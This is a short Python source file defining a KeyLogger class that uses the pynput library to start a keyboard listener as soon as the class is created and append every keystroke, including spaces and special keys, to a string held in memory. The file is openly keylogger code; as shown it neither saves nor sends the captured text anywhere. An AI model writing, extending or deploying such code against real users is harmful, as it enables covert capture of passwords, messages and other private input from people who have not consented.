from pynput import keyboard

class KeyLogger:
    def __init__(self):
        self.logger = ""
        self.key_logger_service()


    def key_logger_service(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        listener.join()

    def on_press(self, key):
        try:
            self.logger += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.logger += " "
            else:
                self.logger += str(key)